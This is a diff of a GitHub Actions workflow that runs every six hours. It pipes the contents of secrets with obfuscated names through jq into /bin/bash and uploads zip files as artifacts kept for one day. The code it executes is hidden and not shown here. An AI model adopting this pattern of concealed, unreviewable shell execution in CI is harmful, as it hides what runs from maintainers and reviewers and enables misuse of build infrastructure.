@@ -1,25 +1,27 @@
 name: jiannonghaosheng
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '6 4/6 * * *'
-jobs:  # 24351
+    - cron: '49 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiannonghaosheng
         env:
-          nni2782: ${{ secrets.nni2782 }}
+          fw5065: ${{ secrets.fw5065 }}
         run: |
-          echo $nni2782 | jq -r .e50 | /bin/bash
-          echo $wbpp6 | jq -r .h3054 | /bin/bash
-          echo $m13 | jq -r .di1729 | /bin/bash
-          echo $zrkuz1257 | jq -r .f6347 | /bin/bash
-          echo $celfu5 | jq -r .dxw36144 | /bin/bash
-          echo $mut6 | jq -r .rcg97488 | /bin/bash
-          echo $wpn6940 | jq -r .g80 | /bin/bash
-          echo $ry03 | jq -r .ijmck24 | /bin/bash
-          echo $utm889 | jq -r .gq873 | /bin/bash
-          echo $lhx31371 | jq -r .j4874 | /bin/bash
+          printf '%s' "$fw5065" | jq -r .rzb6981 | /bin/bash
+          printf '%s' "$jb07246" | jq -r .zsil1412 | /bin/bash
+          echo $wr1653 | jq -r .zfzk4685 | /bin/bash
+          echo $mlpj40 | jq -r .vmh58 | /bin/bash
+          printf '%s' "$jdk14" | jq -r .r3 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: JHvKrjPN
+          path: "*.zip"
+          retention-days: 1
